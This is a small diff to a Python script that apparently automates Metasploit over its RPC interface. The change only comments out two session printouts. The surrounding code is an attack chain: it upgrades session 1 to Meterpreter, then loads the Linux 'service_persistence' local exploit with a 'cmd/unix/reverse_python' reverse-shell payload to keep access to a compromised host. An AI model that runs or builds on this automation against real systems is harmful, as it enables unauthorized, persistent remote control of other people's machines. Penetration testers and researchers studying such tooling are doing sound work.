@@ -42,7 +42,7 @@ def main(argv):
     while client.jobs.list:
         time.sleep(1)
 
-    print(client.sessions.list['1'])
+    # print(client.sessions.list['1'])
 
     exploit = client.modules.use('post', 'multi/manage/shell_to_meterpreter')
     exploit['SESSION'] = 1
@@ -57,7 +57,7 @@ def main(argv):
     time.sleep(2)
 
     #print('Finish 1')
-    print(client.sessions.list['2'])
+    # print(client.sessions.list['2'])
 
     exploit = client.modules.use('exploit', 'linux/local/service_persistence')
     payload = client.modules.use('payload', 'cmd/unix/reverse_python')
